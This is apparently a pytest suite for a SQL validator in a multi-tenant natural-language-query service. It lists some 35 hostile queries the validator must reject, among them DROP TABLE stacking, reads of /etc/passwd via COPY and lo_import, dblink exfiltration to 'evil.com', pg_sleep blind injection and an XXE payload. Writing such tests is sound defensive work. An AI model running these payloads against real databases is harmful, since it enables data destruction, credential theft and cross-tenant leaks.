"""Adversarial tests for SqlglotValidator — must reject malicious queries.

>= 30 hostile cases. Each one MUST raise UnsafeSqlError; the few permitted
cases MUST come out with `tenant_id = :tenant_id` enforced in the WHERE clause.
"""
from __future__ import annotations

from uuid import UUID

import pytest

from domain.model.errors import UnsafeSqlError
from infrastructure.nlq import SqlglotValidator

TENANT = UUID("11111111-1111-1111-1111-111111111111")


@pytest.fixture()
def v() -> SqlglotValidator:
    return SqlglotValidator()


# ----- 30+ MALICIOUS QUERIES — each must raise -----

MALICIOUS_QUERIES: list[tuple[str, str]] = [
    # 1. Statement stacking — SQL injection classic
    ("stmt-stacking-drop",
     "SELECT * FROM pdca_cycles WHERE tenant_id = '1'; DROP TABLE pdca_cycles"),
    # 2. UNION select from pg_catalog (info exfil)
    ("union-pg-catalog",
     "SELECT id FROM pdca_cycles UNION SELECT tablename FROM pg_catalog.pg_tables"),
    # 3. Direct DELETE
    ("delete",
     "DELETE FROM pdca_cycles WHERE tenant_id = '00000000-0000-0000-0000-000000000000'"),
    # 4. UPDATE attempt
    ("update",
     "UPDATE pdca_cycles SET title = 'pwned'"),
    # 5. INSERT
    ("insert",
     "INSERT INTO pdca_cycles (id) VALUES ('a')"),
    # 6. CREATE TABLE
    ("create",
     "CREATE TABLE evil (x int)"),
    # 7. DROP
    ("drop",
     "DROP TABLE pdca_cycles"),
    # 8. ALTER
    ("alter",
     "ALTER TABLE pdca_cycles ADD COLUMN evil text"),
    # 9. TRUNCATE
    ("truncate",
     "TRUNCATE pdca_cycles"),
    # 10. GRANT
    ("grant",
     "GRANT ALL ON pdca_cycles TO public"),
    # 11. COPY (write to file)
    ("copy-to",
     "COPY pdca_cycles TO '/tmp/exfil.csv'"),
    # 12. COPY (read from file)
    ("copy-from",
     "COPY pdca_cycles FROM '/etc/passwd'"),
    # 13. LOAD extension
    ("load",
     "LOAD 'evil_ext'"),
    # 14. DO block
    ("do-block",
     "DO $$ BEGIN DELETE FROM pdca_cycles; END $$"),
    # 15. CALL procedure
    ("call",
     "CALL evil_proc()"),
    # 16. pg_sleep DoS
    ("pg-sleep",
     "SELECT * FROM pdca_cycles WHERE tenant_id = '1' AND pg_sleep(10)::text = ''"),
    # 17. information_schema enum
    ("info-schema",
     "SELECT table_name FROM information_schema.tables"),
    # 18. dblink data exfil
    ("dblink",
     "SELECT * FROM dblink('host=evil.com','select 1') AS t(x int)"),
    # 19. lo_import file read
    ("lo-import",
     "SELECT lo_import('/etc/passwd')"),
    # 20. lo_export file write
    ("lo-export",
     "SELECT lo_export(1, '/tmp/exfil')"),
    # 21. Comment-based injection trying to hide SELECT *
    ("comment-trick",
     "SELECT 1 -- DROP TABLE pdca_cycles"),
    # 22. Table NOT in allow-list
    ("unknown-table",
     "SELECT * FROM users WHERE tenant_id = '1'"),
    # 23. Cross-tenant attempt — explicit other tenant
    ("explicit-cross-tenant",
     "SELECT * FROM pdca_cycles WHERE tenant_id = '99999999-9999-9999-9999-999999999999'"),
    # 24. WHERE 1=1 trying to bypass tenant
    ("where-1-eq-1",
     "SELECT * FROM pdca_cycles WHERE 1=1; SELECT * FROM pdca_cycles"),
    # 25. Time-based blind SQLi
    ("time-blind",
     "SELECT id FROM pdca_cycles WHERE tenant_id = '1' AND CASE WHEN 1=1 THEN pg_sleep(10) ELSE pg_sleep(0) END"),
    # 26. XML / XXE attempt
    ("xmltype-xxe",
     "SELECT xmltype('<?xml version=\"1.0\"?><!DOCTYPE foo SYSTEM \"file:///etc/passwd\">')"),
    # 27. Function exfiltration via current_setting
    ("current-setting-exfil",
     "SELECT current_setting('database_password')"),
    # 28. MERGE statement
    ("merge",
     "MERGE INTO pdca_cycles t USING (SELECT 1) s ON true WHEN MATCHED THEN UPDATE SET title='x'"),
    # 29. VACUUM
    ("vacuum",
     "VACUUM pdca_cycles"),
    # 30. Disallowed aggregate function (no `array_agg` in allow-list)
    ("forbidden-func",
     "SELECT array_agg(id) FROM pdca_cycles WHERE tenant_id = '1'"),
    # 31. EXECUTE dynamic SQL
    ("execute",
     "EXECUTE my_evil_prep"),
    # 32. Statement with trailing junk
    ("stmt-with-junk",
     "SELECT id FROM pdca_cycles WHERE tenant_id = '1' ; --; DELETE FROM pdca_cycles"),
    # 33. Schema-qualified pg_catalog
    ("schema-qualified-pgcatalog",
     "SELECT * FROM pg_catalog.pg_user"),
    # 34. LIMIT abuse (exceeds cap)
    ("limit-abuse",
     "SELECT id FROM pdca_cycles WHERE tenant_id = '1' LIMIT 99999999"),
    # 35. Empty SQL
    ("empty", ""),
]


@pytest.mark.parametrize("case_name,sql", MALICIOUS_QUERIES, ids=[c[0] for c in MALICIOUS_QUERIES])
def test_malicious_query_rejected(v: SqlglotValidator, case_name: str, sql: str):
    with pytest.raises(UnsafeSqlError):
        v.validate_and_rewrite(sql, TENANT)


# ----- BENIGN QUERIES — must succeed AND have tenant filter -----

def test_benign_with_tenant_filter_passes(v: SqlglotValidator):
    out = v.validate_and_rewrite(
        "SELECT count(*) FROM pdca_cycles WHERE tenant_id = :tenant_id",
        TENANT,
    )
    assert out.tenant_filter_applied
    assert "pdca_cycles" in out.tables_used
    assert "count" in out.functions_used


def test_benign_without_tenant_filter_gets_rewritten(v: SqlglotValidator):
    out = v.validate_and_rewrite(
        "SELECT id, severity FROM capa_cases",
        TENANT,
    )
    assert out.tenant_filter_applied
    assert "tenant_id" in out.sql.lower()
    assert "capa_cases" in out.tables_used


def test_benign_with_existing_where_keeps_filter(v: SqlglotValidator):
    out = v.validate_and_rewrite(
        "SELECT id FROM capa_cases WHERE priority = 'high'",
        TENANT,
    )
    assert out.tenant_filter_applied
    sql_lower = out.sql.lower()
    assert "tenant_id" in sql_lower
    assert "priority" in sql_lower


def test_benign_aggregate_with_date_trunc(v: SqlglotValidator):
    out = v.validate_and_rewrite(
        "SELECT date_trunc('month', created_at) AS m, count(*) FROM fives_audits "
        "WHERE tenant_id = :tenant_id GROUP BY 1 ORDER BY 1",
        TENANT,
    )
    # sqlglot may normalize date_trunc -> timestamp_trunc; accept either.
    assert any(f in out.functions_used for f in ("date_trunc", "timestamp_trunc"))
    assert "count" in out.functions_used
    assert "fives_audits" in out.tables_used
